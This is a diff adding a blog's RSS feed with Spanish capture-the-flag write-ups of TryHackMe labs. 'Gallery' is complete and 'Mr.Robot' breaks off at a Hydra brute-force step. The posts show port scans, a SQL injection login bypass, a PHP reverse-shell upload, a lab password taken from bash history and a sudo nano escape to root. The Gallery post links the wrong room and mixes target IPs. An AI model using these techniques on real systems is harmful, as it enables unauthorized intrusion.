@@ -1,0 +1,3519 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>d3b0o</title>
+        <link>https://d3b0o.github.io/post/writeups/</link>
+        <description>Recent content on d3b0o</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Wed, 21 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/post/writeups/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Gallery</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/</link>
+        <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/1.png" alt="Featured image of post Resolución Gallery" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/chocolatefactory&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/chocolatefactory&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.250.47&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.250.47
+PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data.
+64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms
+
+--- 10.10.250.47 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -Pn -vvv -n 10.10.110.190 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.110.190
+   5   │     [*] Open ports: 80,8080
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p80,8080 -sC -sV 10.10.110.190 -oN target
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Simple Image Gallery System
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-p&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+&lt;p&gt;Con el whatweb podemos ver más información de la web&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ whatweb 10.10.110.190
+http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.110.190], Title[Apache2 Ubuntu Default Page: It works]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h3&gt;
+&lt;p&gt;Con wfuzz vamos a fuzzear mediante el dicionario &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; para encontrar subdirectorios&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wfuzz -c -t 200 --hc=404 --hh=42126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.151.26/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos reporta el directorio &lt;strong&gt;/gallery&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;gallery&#34;&gt;/gallery&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login.png&#34;
+	width=&#34;509&#34;
+	height=&#34;371&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login_hu5cfa5e12c6956a57c27f6c93754adb0c_18005_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login_hu5cfa5e12c6956a57c27f6c93754adb0c_18005_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;329px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Al entrar nos lleva a &lt;code&gt;/gallery/login.php&lt;/code&gt; y vemos un panel para iniciar sessión, primero comprobamos si admin:admin funciona, pero no. Podemos probar con usuario &lt;code&gt;&#39; or 1 = 1-- -&lt;/code&gt; y cualquier contraseña y ya nos entra&lt;/p&gt;
+&lt;h4 id=&#34;admin&#34;&gt;Admin&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel.png&#34;
+	width=&#34;1234&#34;
+	height=&#34;544&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel_hub0df3afe1af927c1129dd46afaa77a43_112470_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel_hub0df3afe1af927c1129dd46afaa77a43_112470_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;226&#34;
+		data-flex-basis=&#34;544px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora estamos dentro de la cuenta de administrador y podemos ver los álbums, Al entrar dentro de uno vemos que nos deja subir fotos nuevas.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images.png&#34;
+	width=&#34;1217&#34;
+	height=&#34;425&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images_hu6e0f5c9916f0c6b48464a715e6e29bf1_160607_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images_hu6e0f5c9916f0c6b48464a715e6e29bf1_160607_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;286&#34;
+		data-flex-basis=&#34;687px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Al probar de subir un .php no lo acepta, con burpsuite he probado con un diccionario de extensiones y solo acepta extensiones de fotos&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile.png&#34;
+	width=&#34;1114&#34;
+	height=&#34;304&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile_hu2f9218f1fc3144225108cd74fe098bfa_18219_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile_hu2f9218f1fc3144225108cd74fe098bfa_18219_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;366&#34;
+		data-flex-basis=&#34;879px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Dentro de la configuración del perfil del admin, hay un apartado para cambiar la foto. El mensaje, dice, &lt;code&gt;selecciona un archivo&lt;/code&gt;. Podemos intentar mandarle un archivo .php para mandarnos una reverse shell&lt;/p&gt;
+&lt;h2 id=&#34;intrusión&#34;&gt;Intrusión&lt;/h2&gt;
+&lt;p&gt;Vamos a intentar subir un archivo php de &lt;code&gt;pentestmonkey&lt;/code&gt; para la reverse shell: &lt;a class=&#34;link&#34; href=&#34;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Es importante cambiar las líneas de ip y port y poner la ip de nuestra máquina y el puerto por el que nos vamos a poner en escucha con netcat (443)&lt;/p&gt;
+&lt;p&gt;Ahora ya podemos subir el archivo y al darle a update, recibimos a reverse shell&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;h3 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h3&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;mike&#34;&gt;Mike&lt;/h3&gt;
+&lt;p&gt;Si vamos a /home/mike podemos ver que hay un archivo llamado &lt;strong&gt;user.txt&lt;/strong&gt; el cual debe contener la flag de usuario, Pero no tenemos permisos para leerlo ni para entrar en la carpeta &lt;strong&gt;Documents&lt;/strong&gt; e &lt;strong&gt;Images&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Después de estar un rato buscando he encontrado que en &lt;code&gt;/var/backups&lt;/code&gt; hay una carpeta llamada mike_home_backup en la cual están los archivos de mike y tenemos permisos para leerlos.&lt;/p&gt;
+&lt;p&gt;Dentro de &lt;strong&gt;Documents&lt;/strong&gt; hay un archivo con 3 contraseñas de otras webs con el usuario mike, he probado si alguna de estas sirve para esta máquina pero no.&lt;/p&gt;
+&lt;p&gt;En &lt;strong&gt;Images&lt;/strong&gt;, hay 3 fotos las cuales he mirado si tenían algún archivo oculto pero no&lt;/p&gt;
+&lt;p&gt;Con un ls -a podemos ver que hay un historial &lt;code&gt;.bash_history&lt;/code&gt;con un cat podemos ver su contenido, dentro hay un comando en el que parece especificar una contraseña: &lt;code&gt;sudo -lb3stpassw0rdbr0xx&lt;/code&gt; con el comando &lt;code&gt;su mike&lt;/code&gt; y proporcionando la contraseña &lt;code&gt;b3stpassw0rdbr0xx&lt;/code&gt; ya somos mike&lt;/p&gt;
+&lt;p&gt;Ya podemos ver la flag&lt;/p&gt;
+&lt;h3 id=&#34;root&#34;&gt;Root&lt;/h3&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; Podemos ver que puede ejecutar lo siguiente como root sin contraseña &lt;code&gt;/bin/bash /opt/rootkit.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Al ejecutar &lt;code&gt;sudo /bin/bash /opt/rootkit.sh&lt;/code&gt; y le damos a read nos abre un archivo con un texto muy largo. Como estamos ejecutando nano como root podemos probar con &lt;code&gt;ctrl + r&lt;/code&gt;, &lt;code&gt;ctrl + x&lt;/code&gt; y escribiendo reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0, ya somos root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución CTF Mr.Robot</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/</link>
+        <pubDate>Tue, 20 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/1.jpg" alt="Featured image of post Resolución CTF Mr.Robot" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/mrrobot&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/mrrobot&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.193.138&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.193.138
+PING 10.10.193.138 (10.10.193.138) 56(84) bytes of data.
+64 bytes from 10.10.193.138: icmp_seq=1 ttl=63 time=56.6 ms
+
+--- 10.10.193.138 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 56.631/56.631/56.631/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.193.138 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.46.125
+   5   │     [*] Open ports: 80,443
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p80,443 -sV -sC 10.10.193.138 -oN target
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache
+443/tcp open  ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn&#39;t have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;web&#34;&gt;Web&lt;/h3&gt;
+&lt;p&gt;Con el whatweb podemos ver mas información sobre la web&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.193.138
+http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.193.138], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar a la web vemos una animación que simula el arranque de un Linux, quando termina muestra el siguiente mensaje&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal.png&#34;
+	width=&#34;1834&#34;
+	height=&#34;417&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal_huc6b174745ebc0090e690d4f12e04ad03_58746_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal_huc6b174745ebc0090e690d4f12e04ad03_58746_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;439&#34;
+		data-flex-basis=&#34;1055px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Mas abajo vemos una &amp;ldquo;terminal&amp;rdquo; en la cual solo se pueden usar los comandos que salen arriba&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2.png&#34;
+	width=&#34;254&#34;
+	height=&#34;232&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2_huf238a89a3a7bb233398a1aa87a6d3e04_10854_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2_huf238a89a3a7bb233398a1aa87a6d3e04_10854_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;262px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Todos los comandos muestran videos, fotos y mensajes relacionados con la serie&amp;hellip;&lt;/p&gt;
+&lt;h3 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h3&gt;
+&lt;p&gt;Para ver si hay subdirectorios vamos a usar la herramienta gpbuster para fusear mediante un diccionario que está en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u http://10.10.46.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+2022/12/19 21:57:53 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 236] [--&amp;gt; http://10.10.193.138/images/]
+/blog                 (Status: 301) [Size: 234] [--&amp;gt; http://10.10.193.138/blog/]
+/rss                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/]
+/sitemap              (Status: 200) [Size: 0]
+/login                (Status: 302) [Size: 0] [--&amp;gt; http://10.10.193.138/wp-login.php]
+/0                    (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/0/]
+/feed                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/]
+/video                (Status: 301) [Size: 235] [--&amp;gt; http://10.10.193.138/video/]
+/image                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/image/]
+/atom                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/atom/]
+/wp-content           (Status: 301) [Size: 240] [--&amp;gt; http://10.10.193.138/wp-content/]
+/admin                (Status: 301) [Size: 235] [--&amp;gt; http://10.10.193.138/admin/]
+/audio                (Status: 301) [Size: 235] [--&amp;gt; http://10.10.193.138/audio/]
+/intro                (Status: 200) [Size: 516314]
+/wp-login             (Status: 200) [Size: 2613]
+/css                  (Status: 301) [Size: 233] [--&amp;gt; http://10.10.193.138/css/]
+/rss2                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/]
+/license              (Status: 200) [Size: 309]
+/wp-includes          (Status: 301) [Size: 241] [--&amp;gt; http://10.10.193.138/wp-includes/]
+/js                   (Status: 301) [Size: 232] [--&amp;gt; http://10.10.193.138/js/]
+/Image                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/Image/]
+/rdf                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/rdf/]
+/page1                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/]
+/readme               (Status: 200) [Size: 64]
+/robots               (Status: 200) [Size: 41]
+/dashboard            (Status: 302) [Size: 0] [--&amp;gt; http://10.10.193.138/wp-admin/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos reporta muchos subdirectorios, despues de ir probando uno por uno, e visto 2 que son importantes&lt;/p&gt;
+&lt;h4 id=&#34;robots&#34;&gt;/robots/&lt;/h4&gt;
+&lt;p&gt;Contenido del &lt;code&gt;/robots/&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;User-agent: *
+fsocity.dic
+key-1-of-3.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos la primera key&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ curl http://10.10.193.138/key-1-of-3.txt
+---------- key 1 ----------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En el robots también indica otro archivo &lt;code&gt;fsocity.dic&lt;/code&gt;, con wget nos lo podemos passar a nuestra máquina&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ wget http://10.10.193.138/fsocity.dic
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Es un dicionario con 858160 palabras&lt;/p&gt;
+&lt;h4 id=&#34;wp-admin&#34;&gt;/wp-admin/&lt;/h4&gt;
+&lt;p&gt;En &lt;code&gt;wp-admin&lt;/code&gt; hay un panel de login de WordPress, probamos con las típicas credenciales admin:admin, no funcionan pero hay un pequeño detalle importante&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username.png&#34;
+	width=&#34;444&#34;
+	height=&#34;605&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username_hu4cfba9e249384bf4123948e9d57012cf_21228_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username_hu4cfba9e249384bf4123948e9d57012cf_21228_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;73&#34;
+		data-flex-basis=&#34;176px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;En vez de decir que las credenciales són incorrectas, especifica que es lo que esta mal, aprovechando esto podemos usar un diccionario de usuarios hasta que no de ese error y despues con las contraseñas&lt;/p&gt;
+&lt;h2 id=&#34;intrusion&#34;&gt;Intrusion&lt;/h2&gt;
+&lt;p&gt;Con hydra vamos a probar con los usuarios de el dicionario que nos descargamos de &lt;code&gt;/fsocity.dic/&lt;/code&gt; con la contraseña test&lt;/p&gt;
